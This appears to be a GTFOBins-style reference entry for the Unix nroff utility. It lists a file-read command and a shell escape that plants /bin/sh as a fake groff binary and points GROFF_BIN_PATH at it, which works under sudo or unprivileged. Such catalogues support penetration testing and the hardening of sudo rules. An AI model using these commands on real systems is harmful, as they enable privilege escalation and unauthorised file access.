---
type: gtfobin
name: nroff
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# nroff

## file-read

```bash
nroff /path/to/input-file
```
_The file is typeset and some warning messages may appear._
**Contexts:** sudo, unprivileged

## shell

```bash
echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff
```
**Contexts:** sudo, unprivileged
